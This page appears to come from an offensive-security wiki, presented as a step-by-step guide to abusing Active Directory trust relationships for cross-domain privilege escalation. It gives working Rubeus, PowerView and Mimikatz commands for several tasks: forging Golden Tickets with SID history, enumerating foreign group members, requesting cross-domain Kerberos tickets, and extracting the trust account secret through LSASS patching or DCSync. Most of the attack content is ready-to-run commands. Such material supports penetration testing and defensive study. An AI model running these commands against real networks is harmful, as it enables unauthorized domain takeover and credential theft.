---
layout: default
title: Trust Relationship Abuse
parent: Active Directory
nav_order: 1
permalink: /ad/trust/
---

# Trust Relationship Abuse
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

Let's assume a trust relationship between two domains `A` and `B` being `A trust B`. If you are Domain Admin in at least one of these two domains, you can gain access - *even Domain Admin rights* - in the other one. **The exploit will depend on the trust direction**.

## Prerequisites

* Being Domain Admin in a domain involved in a [trust relationship](/ad/enumeration/#trust-relationships).

## Exploit

### Parent trust relationship

Let's assume you are Domain Admin in domain `A` which is the child of domain `B`, both **in the same forest**. In this case, you can leverage SID history to gain Domain Admin access in parent domain `B`. To do so, you can forge [Golden](/ad/golden/) or [Diamond](/ad/diamond/) tickets for the parent directory.

{: .important }
> The Golden ticket must be forged for a user that exists in both parent and child domain. Targeting `Administrator` Domain Admin is a good start.

```powershell
# Get SID of the target group - Domain Admin for sure - in the parent domain.
Get-DomainGroup -Identity "Domain Admins" -Domain $ParentDomainFQDN -Properties ObjectSid

# Get SID of the child - current - domain you are in.
Get-DomainSID

# Forge a Golden Ticket using previous ObjectSid.
Rubeus.exe golden /user:$Username /aes256:$Hash /domain:$ChildDomainFQDN /sid:$ChildDomainSid /sids:$TargetGroupSID /nowrap
```

[Import the ticket](/ad/passtheticket/) in your session to gain Domain Admin access to the parent domain.

### Inbound trust relationship

Let's assume you are Domain Admin in domain `B`. Therefore, you can enumerate domain `A` by leveraging the trust. First, use [PowerView](https://github.com/PowerShellMafia/PowerSploit) to list group members outside the target domain.

```powershell
# Get group members SID (MemberName attribute).
Get-DomainForeignGroupMember -Domain $DomainAFQDN
```

To perform this exploit, previous command must returns something. It's even better if it reterns a privileged domain user or group.

```powershell
# Resolve SID of MemberName.
ConvertFrom-SID $MemberName

# If this SID corresponds to a domain group, get members.
Get-DomainGroupMember -Identity "$GroupName" | select MemberName
```

At this point, you have a username in domain `B` that is member of a group - *Domain Admin, I cross fingers for you* - in domain `A`.

```powershell
# Request a TGT for the user.
./Rubeus.exe asktgt /user:$Username /domain:$DomainBFQDN /aes256:$Hash /nowrap

# Request a krbtgt TGS for the target domain (mandatory step).
./Rubeus.exe asktgs /service:krbtgt/$DomainAFQDN /domain:$DomainBFQDN /dc:$DomainBControllerFQDN /ticket:$TGTBase64Ticket /nowrap

# Request any service TGS for the target domain using previous TGS.
./Rubeus.exe asktgs /service:cifs/$DomainAFQDN /domain:$DomainAFQDN /dc:$DomainAControllerFQDN /ticket:$TGSBase64Ticket /nowrap
```

You can [pass the ticket](/ad/passtheticket/) into a new session and access the targeted service.

{: .important }
> Note that in the case you are facing 3 domains with transitive relationships (`A -> B -> C`), if you are Domain Admin in domain `C`, you can leverage SID History to directly escalate your privileges in domain A.

### Outbound trust relationship

Let's assume you are Domain Admin in domain `A`. With `A trust B` relationship, you can't enumerate domain `B` but you can still gain a low privilege access to the domain by stealing the shared password contained in the Trusted Domain Object (TDO).

First way to do that is extracting the secret directly from domain `A` controllers' LSASS with [Mimikatz](https://github.com/gentilkiwi/mimikatz).

{: .warning }
> This method is **dangerous** because it performs memory patching. It could cause a crash or a memory corruption of the domain controller.

```powershell
lsadump::trust /patch
```

Second - *and recommended* - way to do it is by performing [DCSync] attack with the TDO.

```powershell
./ADSearch.exe --search "(objectCategory=trustedDomain)" --domain $DomainAFQDN --attributes distinguishedName

# Get the Trust Domain Object GUID.
Get-DomainObject -Identity "$DomainBDistinguishedName" | select ObjectGuid

# With Mimikatz.
lsadump::dcsync /domain:$DomainAFQDN /guid:{$TrustDomainObjectGUID} 
```

The secret that we want is `[Out].rc4_hmac_nt`. Now, you must consider that an account is created in every trusted domain corresponding to the NETBIOS name of the trusting one. In our case, domain B should contain a user named something like `DOMAINA$`. This is the user we are going to impersonate with the previously recovered secret.

```powershell
./Rubeus.exe asktgt /user:$NetBiosDomainA /domain:$domainB /rc4:$rc4_hmac_nt /nowrap
```

You can now use this previous TGT to access domain `B`. Time for a [domain enumeration](/ad/enumeration/), right?